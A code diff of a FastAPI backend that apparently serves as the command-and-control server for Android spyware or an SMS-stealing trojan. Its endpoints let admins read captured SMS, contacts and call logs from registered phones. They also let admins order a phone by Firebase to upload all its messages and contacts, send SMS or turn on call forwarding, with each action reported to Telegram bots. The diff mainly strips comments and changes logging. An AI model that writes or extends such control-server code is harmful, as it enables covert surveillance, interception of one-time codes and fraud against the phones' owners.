     if app_type:
         query["app_type"] = app_type
     
-    # فقط device های معتبر (که حداقل model دارن)
     query["model"] = {"$exists": True, "$ne": None}
-    
-    # دریافت دستگاه‌ها با فیلتر
     devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
     devices = await devices_cursor.to_list(length=limit)
-    
-    # محاسبه total بر اساس فیلتر
     total = await mongodb.db.devices.count_documents(query)
     
     has_more = (skip + len(devices)) < total
@@ -1277,49 +1054,38 @@ async def get_devices(
         hasMore=has_more
     )
 
-
 @app.get("/api/admin/{admin_username}/devices", response_model=DeviceListResponse)
 async def get_admin_devices(
     admin_username: str,
     skip: int = Query(0, ge=0),
     limit: int = Query(100, ge=1, le=1000),
-    app_type: Optional[str] = Query(None, description="فیلتر بر اساس نوع اپلیکیشن"),
+    app_type: Optional[str] = Query(None, description="Filter by app type"),
     current_admin: Admin = Depends(require_permission(AdminPermission.MANAGE_ADMINS))
 ):
-    """
-    🔐 فقط Administrator: مشاهده دستگاه‌های یک ادمین خاص
     
-    - فقط Super Admin می‌تونه از این endpoint استفاده کنه
-    - لیست دستگاه‌های یک ادمین خاص رو برمی‌گردونه
-    - فیلتر بر اساس app_type (اختیاری)
-    """
-    # بررسی اینکه ادمین مورد نظر وجود داره
     target_admin = await auth_service.get_admin_by_username(admin_username)
+    
     if not target_admin:
         raise HTTPException(status_code=404, detail=f"Admin '{admin_username}' not found")
     
-    # دستگاه‌های ادمین مورد نظر با فیلتر app_type
     query = {"admin_username": admin_username}
     if app_type:
         query["app_type"] = app_type
     
-    # فقط device های معتبر (که حداقل model دارن)
     query["model"] = {"$exists": True, "$ne": None}
     
-    # دریافت دستگاه‌ها
     devices_cursor = mongodb.db.devices.find(query).skip(skip).limit(limit).sort("registered_at", -1)
     devices = await devices_cursor.to_list(length=limit)
-    
     total = await mongodb.db.devices.count_documents(query)
     has_more = (skip + len(devices)) < total
     
-    # Log activity
     await admin_activity_service.log_activity(
         admin_username=current_admin.username,
         activity_type=ActivityType.VIEW_DEVICE,
         description=f"Viewed devices for admin: {admin_username}" + (f" (app: {app_type})" if app_type else ""),
         ip_address="system"
     )
+    print(devices)
     
     return DeviceListResponse(
         devices=devices,
@@ -1327,13 +1093,13 @@ async def get_admin_devices(
         hasMore=has_more
     )
 
-
 @app.get("/api/devices/{device_id}")
 async def get_device(
     device_id: str,
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
+    
     device = await device_service.get_device(device_id)
 
     if not device:
@@ -1357,6 +1123,7 @@ async def get_device_sms(
     request: Request = None,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_SMS))
 ):
+    
     messages = await device_service.get_sms_messages(device_id, skip, limit)
     total = await mongodb.db.sms_messages.count_documents({"device_id": device_id})
 
@@ -1388,6 +1155,7 @@ async def get_device_contacts(
     request: Request = None,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_CONTACTS))
 ):
+    
     contacts = await device_service.get_contacts(device_id, skip, limit)
     total = await mongodb.db.contacts.count_documents({"device_id": device_id})
 
@@ -1412,6 +1180,7 @@ async def get_device_logs(
     limit: int = Query(100, ge=1, le=500),
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
+    
     logs = await device_service.get_logs(device_id, skip, limit)
     total = await mongodb.db.logs.count_documents({"device_id": device_id})
 
@@ -1420,7 +1189,6 @@ async def get_device_logs(
         "total": total
     }
 
-
 @app.post("/api/devices/{device_id}/command")
 async def send_command_to_device(
     device_id: str,
@@ -1428,24 +1196,20 @@ async def send_command_to_device(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.SEND_COMMANDS))
 ):
+    
     device = await device_service.get_device(device_id)
+    
     if not device:
         raise HTTPException(status_code=404, detail="Device not found")
 
-    # ═══════════════════════════════════════════════════════
-    # 📝 دستور NOTE
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "note":
         priority = command_request.parameters.get("priority", "none")
         message = command_request.parameters.get("message", "")
-        
-        # ذخیره در دیتابیس
         success = await device_service.save_device_note(device_id, priority, message)
         
         if not success:
             raise HTTPException(status_code=400, detail="Failed to save note")
         
-        # ارسال به دستگاه از طریق Firebase
         result = await firebase_service.send_command_to_device(
             device_id,
             "note",
@@ -1455,7 +1219,6 @@ async def send_command_to_device(
             }
         )
         
-        # لاگ فعالیت ادمین
         await admin_activity_service.log_activity(
             admin_username=current_admin.username,
             activity_type=ActivityType.SEND_COMMAND,
@@ -1472,16 +1235,10 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 🔔 دستور PING از طریق Firebase
-    # ═══════════════════════════════════════════════════════
     is_ping_command = command_request.command == "ping"
     ping_type = command_request.parameters.get("type", "server") if command_request.parameters else "server"
 
     if is_ping_command and ping_type == "firebase":
-        logger.info(f"📤 Sending Firebase ping to device: {device_id}")
-
-        # ✅ حذف type از parameters تا override نشه
         params = {k: v for k, v in (command_request.parameters or {}).items() if k != "type"}
         
         result = await firebase_service.send_command_to_device(
@@ -1502,11 +1259,8 @@ async def send_command_to_device(
             metadata={"command": "ping", "type": "firebase", "result": result}
         )
 
-        await device_service.add_log(
-            device_id, "command", "Firebase ping sent", "info"
-        )
+        await device_service.add_log(device_id, "command", "Firebase ping sent", "info")
         
-        # 🔔 اعلان به ربات ادمین
         await telegram_multi_service.notify_command_sent(
             current_admin.username, device_id, "ping (firebase)"
         )
@@ -1518,9 +1272,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 📨 دستور ارسال SMS
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "send_sms":
         phone = command_request.parameters.get("phone")
         message = command_request.parameters.get("message")
@@ -1556,9 +1307,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 📞 دستور فعال‌سازی هدایت تماس
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "call_forwarding":
         forward_number = command_request.parameters.get("number")
         sim_slot = command_request.parameters.get("simSlot", 0)
@@ -1592,9 +1340,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 📵 دستور غیرفعال‌سازی هدایت تماس
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "call_forwarding_disable":
         sim_slot = command_request.parameters.get("simSlot", 0)
 
@@ -1623,9 +1368,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 📨⚡ دستور آپلود سریع SMS (50 پیامک)
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "quick_upload_sms":
         result = await firebase_service.quick_upload_sms(device_id)
 
@@ -1649,9 +1391,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 👥⚡ دستور آپلود سریع Contacts (50 مخاطب)
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "quick_upload_contacts":
         result = await firebase_service.quick_upload_contacts(device_id)
 
@@ -1675,9 +1414,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 📨📦 دستور آپلود کامل همه SMS
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "upload_all_sms":
         result = await firebase_service.upload_all_sms(device_id)
 
@@ -1701,9 +1437,6 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # 👥📦 دستور آپلود کامل همه Contacts
-    # ═══════════════════════════════════════════════════════
     if command_request.command == "upload_all_contacts":
         result = await firebase_service.upload_all_contacts(device_id)
 
@@ -1727,16 +1460,11 @@ async def send_command_to_device(
             "result": result
         }
 
-    # ═══════════════════════════════════════════════════════
-    # ❌ دستور ناشناخته
-    # ═══════════════════════════════════════════════════════
     else:
         raise HTTPException(
             status_code=400, 
             detail=f"Unknown command: {command_request.command}"
         )
-
-
 
 @app.put("/api/devices/{device_id}/settings")
 async def update_device_settings(
@@ -1745,7 +1473,7 @@ async def update_device_settings(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.CHANGE_SETTINGS))
 ):
-
+    
     device = await device_service.get_device(device_id)
     if not device:
         raise HTTPException(status_code=404, detail="Device not found")
@@ -1777,7 +1505,6 @@ async def update_device_settings(
         metadata={"changes": settings_dict}
     )
 
-    # 🔔 اعلان تغییر تنظیمات به ربات 3 (Admin activities)
     try:
         await telegram_multi_service.notify_admin_action(
             current_admin.username,
@@ -1785,11 +1512,9 @@ async def update_device_settings(
             f"Device: {device_id}, Changes: {', '.join(settings_dict.keys())}"
         )
     except Exception as e:
-        logger.warning(f"⚠️ Failed to send Telegram notification: {e}")
+        raise
 
-    await device_service.add_log(
-        device_id, "settings", "Settings updated", "info", settings_dict
-    )
+    await device_service.add_log(device_id, "settings", "Settings updated", "info", settings_dict)
 
     return {
         "success": True,
@@ -1802,6 +1527,7 @@ async def delete_device_sms(
     request: Request,
     current_admin: Admin = Depends(require_permission(AdminPermission.DELETE_DATA))
 ):
+    
     result = await mongodb.db.sms_messages.delete_many({"device_id": device_id})
 
     await admin_activity_service.log_activity(
@@ -1813,7 +1539,6 @@ async def delete_device_sms(
         metadata={"type": "sms", "count": result.deleted_count}
     )
 
-    # 🔔 اعلان حذف داده به ربات 3 (Admin activities)
     try:
         await telegram_multi_service.notify_admin_action(
             current_admin.username,
@@ -1821,7 +1546,7 @@ async def delete_device_sms(
             f"Deleted {result.deleted_count} SMS messages from device {device_id}"
         )
     except Exception as e:
-        logger.warning(f"⚠️ Failed to send Telegram notification: {e}")
+        raise
 
     return {
         "success": True,
@@ -1836,8 +1561,8 @@ async def get_device_calls(
     request: Request = None,
     current_admin: Admin = Depends(require_permission(AdminPermission.VIEW_DEVICES))
 ):
+    
     try:
-
         calls_cursor = mongodb.db.call_logs.find(
             {"device_id": device_id}
         ).sort("timestamp", -1).skip(skip).limit(limit)
@@ -1876,7 +1601,6 @@ async def get_device_calls(
         }
 
     except Exception as e:
-        logger.error(f"❌ Failed to get call logs: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
     return {
